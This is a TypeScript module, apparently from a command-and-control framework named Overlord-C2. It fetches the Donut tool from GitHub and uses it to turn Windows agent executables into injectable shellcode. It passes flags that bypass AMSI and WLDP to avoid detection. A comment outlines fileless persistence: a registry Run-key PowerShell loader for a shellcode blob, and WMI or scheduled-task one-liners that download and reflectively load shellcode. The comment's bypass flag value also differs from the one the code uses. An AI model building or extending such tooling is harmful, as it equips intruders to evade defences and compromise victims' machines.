import fs from "fs";
import path from "path";
import { $ } from "bun";
import { ensureDataDir } from "../paths";
import { logger } from "../logger";

const DONUT_REPO = "TheWover/donut";
const VERSION_TTL_MS = 24 * 60 * 60 * 1000; // re-check GitHub at most once per day

type CachedVersion = { tag: string; cachedAt: number };

function toolsDir(): string {
  return path.join(ensureDataDir(), "tools");
}

function binaryPath(): string {
  return path.join(toolsDir(), process.platform === "win32" ? "donut.exe" : "donut");
}

function versionFilePath(): string {
  return path.join(toolsDir(), "donut.version");
}

function readCache(): CachedVersion | null {
  try { return JSON.parse(fs.readFileSync(versionFilePath(), "utf8")); } catch { return null; }
}

function writeCache(tag: string): void {
  try {
    fs.mkdirSync(toolsDir(), { recursive: true });
    fs.writeFileSync(versionFilePath(), JSON.stringify({ tag, cachedAt: Date.now() }));
  } catch {}
}

async function findSystemDonut(): Promise<string | null> {
  const systemCandidates = ["/usr/local/bin/donut", "/usr/bin/donut"];
  for (const c of systemCandidates) {
    if (fs.existsSync(c)) return c;
  }
  try {
    const r = await $`which donut`.quiet().nothrow();
    if (r.exitCode === 0) {
      const p = r.stdout.toString().trim();
      if (p) return p;
    }
  } catch {}
  return null;
}

type AssetInfo = { tag: string; downloadUrl: string; isArchive?: boolean };

async function fetchLatest(): Promise<AssetInfo | null> {
  try {
    const res = await fetch(
      `https://api.github.com/repos/${DONUT_REPO}/releases/latest`,
      { headers: { "User-Agent": "Overlord-C2", Accept: "application/vnd.github+json" } },
    );
    if (!res.ok) return null;
    const data = await res.json() as any;
    const tag: string = data.tag_name;
    const assets: { name: string; browser_download_url: string }[] = data.assets ?? [];

    // Prioritised binary names for each host platform
    const candidates =
      process.platform === "win32"
        ? ["donut.exe", "donut_x64.exe", "donut_x86_64.exe"]
        : ["donut_x64", "donut_x86_64", "donut-linux-x64", "donut-linux", "donut"];

    for (const name of candidates) {
      const asset = assets.find(a => a.name.toLowerCase() === name.toLowerCase());
      if (asset) return { tag, downloadUrl: asset.browser_download_url };
    }

    // Last-resort: any asset starting with "donut" with no extension (Linux binary)
    if (process.platform !== "win32") {
      const fallback = assets.find(a => /^donut/i.test(a.name) && !a.name.includes("."));
      if (fallback) return { tag, downloadUrl: fallback.browser_download_url };
    }

    // Releases may only ship archives (e.g. v1.1 ships tar.gz/zip, no bare binary).
    // Fall back to downloading and extracting the archive.
    if (process.platform !== "win32") {
      const tarGz = assets.find(a => /donut/i.test(a.name) && a.name.endsWith(".tar.gz"));
      if (tarGz) return { tag, downloadUrl: tarGz.browser_download_url, isArchive: true };
      const zip = assets.find(a => /donut/i.test(a.name) && a.name.endsWith(".zip"));
      if (zip) return { tag, downloadUrl: zip.browser_download_url, isArchive: true };
    }

    return null;
  } catch {
    return null;
  }
}

async function downloadBinary(url: string, dest: string, isArchive = false): Promise<boolean> {
  try {
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    const res = await fetch(url);
    if (!res.ok) return false;
    const buf = await res.arrayBuffer();

    if (!isArchive) {
      fs.writeFileSync(dest, Buffer.from(buf), { mode: 0o755 });
      return true;
    }

    // Archive (tar.gz): write to a temp file, then extract the 'donut' binary from it.
    const tmpArchive = dest + ".tmp.tar.gz";
    fs.writeFileSync(tmpArchive, Buffer.from(buf));
    try {
      const destDir = path.dirname(dest);
      // Try with --strip-components first (archive has a top-level dir), then without.
      let r = await $`tar xzf ${tmpArchive} --strip-components=1 -C ${destDir} ./donut`
        .nothrow().quiet();
      if (r.exitCode !== 0 || !fs.existsSync(dest)) {
        r = await $`tar xzf ${tmpArchive} -C ${destDir} donut`.nothrow().quiet();
      }
      if (!fs.existsSync(dest)) return false;
      fs.chmodSync(dest, 0o755);
      return true;
    } finally {
      try { fs.unlinkSync(tmpArchive); } catch {}
    }
  } catch {
    return false;
  }
}

/**
 * Ensures the Donut binary is present and up-to-date.
 * Downloads from the latest GitHub release if absent or the cached version
 * info is older than VERSION_TTL_MS.
 * Returns the path to the binary, or null if it could not be obtained.
 */
export async function ensureDonut(
  sendToStream?: (data: any) => void,
): Promise<string | null> {
  const bin = binaryPath();
  const cached = readCache();
  const binExists = fs.existsSync(bin);
  const stale = !cached || Date.now() - cached.cachedAt > VERSION_TTL_MS;

  const log = (text: string, level = "info") => {
    logger.info(`[donut] ${text.trim()}`);
    sendToStream?.({ type: "output", text: `${text}\n`, level });
  };

  if (binExists && !stale) {
    log(`Donut: using cached ${cached!.tag}`);
    return bin;
  }

  // Prefer a system-installed binary (e.g. pre-fetched in Docker image) before
  // hitting GitHub. If found, record it so future calls skip the check.
  const sysBinEarly = await findSystemDonut();
  if (sysBinEarly) {
    log(`Donut: using system binary at ${sysBinEarly}`);
    writeCache("system");
    return sysBinEarly;
  }

  log("Donut: checking GitHub for latest release…");
  const latest = await fetchLatest();

  if (!latest) {
    if (binExists) {
      log(`Donut: GitHub unreachable — using cached ${cached?.tag ?? "unknown"}`, "warn");
      return bin;
    }
    log("Donut: GitHub unreachable and no binary available", "error");
    return null;
  }

  if (binExists && cached?.tag === latest.tag) {
    log(`Donut: already at latest (${latest.tag})`);
    writeCache(latest.tag); // refresh TTL
    return bin;
  }

  log(`Donut: downloading ${latest.tag}…`);
  const ok = await downloadBinary(latest.downloadUrl, bin, latest.isArchive);
  if (!ok) {
    if (binExists) {
      log(`Donut: download failed — using cached ${cached?.tag ?? "unknown"}`, "warn");
      return bin;
    }
    log("Donut: download failed and no cached binary available", "error");
    return null;
  }

  writeCache(latest.tag);
  log(`Donut: ready (${latest.tag})`);
  return bin;
}

/**
 * Converts a Windows PE executable to position-independent shellcode using Donut.
 *
 * Flags used:
 *   -f 1   raw shellcode output (no base64/C/etc wrapping)
 *   -a 1|2 architecture (1=x86, 2=x64)
 *   -b 2   bypass AMSI + WLDP by returning failure (abort) — avoids detection
 *   -x 1   exit by thread exit, not process exit — prevents crashing the host
 *
 * NOTE — persistence in shellcode mode:
 *   When the agent runs as shellcode injected into another process, os.Executable()
 *   on Windows resolves to the HOST process binary via GetModuleFileNameW(NULL).
 *   Persistence methods (startup, registry, taskscheduler, wmi) would therefore
 *   register the HOST executable for autostart — not the agent — which is wrong.
 *
 *   Theoretical fixes:
 *   1. Server-side stage-2 push: after first connection the server sends agent_update
 *      with a PE binary (persistence-enabled). Agent writes it to disk + registers.
 *   2. Registry shellcode blob: store raw shellcode in a Run key with a PowerShell
 *      loader stub that allocates RWX memory, copies the blob, and CreateThread's it.
 *      Requires a new persist_shellcode_registry build tag in the agent.
 *   3. WMI/task scheduler with a PS one-liner that downloads and reflectively loads
 *      the shellcode each time the trigger fires (fully fileless persistence).
 *   4. Self-droping: on first run, agent uses VirtualQuery on a known code pointer to
 *      locate its own loaded image, writes it to a temp path, and registers from there.
 */
export async function runDonut(
  inputPe: string,
  outputBin: string,
  arch: "amd64" | "386",
  sendToStream: (data: any) => void,
): Promise<boolean> {
  const bin = await ensureDonut(sendToStream);
  if (!bin) {
    sendToStream({ type: "output", text: "ERROR: Donut binary not available\n", level: "error" });
    return false;
  }

  const archFlag = arch === "386" ? "1" : "2";

  try {
    // -i flag required since donut v1 (previously positional arg)
    const result = await $`${bin} -f 1 -a ${archFlag} -b 3 -x 1 -o ${outputBin} -i ${inputPe}`
      .nothrow()
      .quiet();
    const stdout = result.stdout.toString().trim();
    if (stdout) {
      sendToStream({ type: "output", text: stdout + "\n", level: "info" });
    }
    if (result.exitCode !== 0) {
      const stderr = result.stderr.toString().trim();
      sendToStream({ type: "output", text: `Donut failed (exit ${result.exitCode})${stderr ? `: ${stderr}` : ""}\n`, level: "error" });
      return false;
    }
    const outSize = fs.existsSync(outputBin) ? fs.statSync(outputBin).size : 0;
    if (outSize === 0) {
      sendToStream({ type: "output", text: "Donut produced no output — check that the input PE is valid\n", level: "error" });
      return false;
    }
    return true;
  } catch (err: any) {
    sendToStream({ type: "output", text: `Donut error: ${err?.message ?? err}\n`, level: "error" });
    return false;
  }
}